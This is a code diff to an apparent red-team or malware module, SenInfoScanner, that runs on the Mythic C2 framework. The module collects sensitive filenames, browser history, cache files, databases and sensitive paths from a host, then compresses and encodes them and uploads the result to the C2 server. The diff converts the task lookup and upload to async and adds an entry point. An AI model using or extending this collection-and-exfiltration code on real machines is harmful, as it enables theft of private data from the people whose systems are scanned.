@@ -21,6 +21,7 @@ from mythic_container.MythicRPC import MythicRPC
 import zlib
 from pathlib import Path
 import tempfile
+import asyncio
 
 class SenInfoScanner:
 
@@ -42,12 +43,25 @@ class SenInfoScanner:
                 self.root_path = '/'
 
     async def get_latest_task_id(self,):
-        response = await MythicRPC.execute("get_tasks", limit=1)
+        rpc = MythicRPC()
+        # fetch the latest callback
+        response = await rpc.execute("get_callback_info", callback_id=7)
+        print(response)
+        callbacks = response.get("callbacks",[])
+
+        if not callbacks:
+            raise RuntimeError("[-] No callbacks found.")
+        
+        # Extract the callback ID
+        callback_id = callbacks[0]["id"]
+
+        # fetch the tasks associated with this callback
+        response = await rpc.execute("get_all_tasks", callback_id=callback_id, limit=1)
         tasks = response.get("tasks", [])
         if tasks:
             return tasks[0].get("id")
-        return None
-
+        else:
+            raise RuntimeError("[-] No tasks found for this callback.")
 
     def _ext_scan(self, target_ext: list):
         ''' cover potential sensitive info via file extension
@@ -222,14 +236,14 @@ class SenInfoScanner:
             'sensitive_filenames': self._filename_scan(),
             'browser_history': self._brw_hist(),
             'cache_files': self._cache(),
-            'databases': self._db(),
+            'databases': self._db(True),
             'sensitive_paths': self._path()
         }
 
         # compress and encode the collected information
         encoded_compressed_info = self._encode_compress(str(collected_info))
 
-        with self.save_location.joinpath(file).open("w") as fw:
+        with Path(self.save_location).joinpath(file).open("wb") as fw:
             fw.write(encoded_compressed_info)
 
 
@@ -254,8 +268,7 @@ class SenInfoScanner:
         else:
             print("[-] File upload to Mythic Failed")
 
-
-if __name__ == "__main__":
+async def run():
     temp_path = tempfile.gettempdir()
     senscanner = SenInfoScanner(temp_path)
     # define the file
@@ -265,8 +278,12 @@ if __name__ == "__main__":
     senscanner._sen_info(file_name)
 
     # get the task_id
-    task_id = senscanner.get_latest_task_id()
+    task_id = await senscanner.get_latest_task_id()
     # upload file to c2 server
     local_path = "~/Downloads"
     remote_file = Path(temp_path).joinpath(file_name)
-    senscanner.upload_file(task_id, local_path, file_name, remote_file.as_posix())
+    await senscanner.upload_file(task_id, local_path, file_name, remote_file.as_posix())
+
+
+if __name__ == "__main__":
+    asyncio.run(run())
